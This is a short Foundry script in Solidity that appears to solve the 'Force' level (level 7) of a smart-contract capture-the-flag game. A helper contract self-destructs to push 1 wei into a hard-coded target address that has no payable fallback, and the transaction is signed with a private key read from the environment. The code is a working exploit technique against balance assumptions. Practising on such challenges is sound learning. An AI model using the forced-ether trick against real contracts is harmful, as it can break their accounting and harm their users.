pragma solidity ^0.6.0;

import "../src/level7.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Ded {
    constructor(address payable addr) public payable {
        selfdestruct(addr);
    }
}

contract Solution is Script {
    Force public ins = Force(0x9f9273bfA63a06938200f3b44C89b7Fc1C42A5E8);
    // SPDX-License-Identifier: MIT
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // selfdestruct destroy the contract and send all the balance to the address
        console.log(address(ins).balance);
        //cannot call cuz no fallback
        // address(ins).call{value: 1 wei}("");

        (new Ded){value: 1 wei}(payable(0x9f9273bfA63a06938200f3b44C89b7Fc1C42A5E8));

        console.log(address(ins).balance);
        vm.stopBroadcast();
    }
}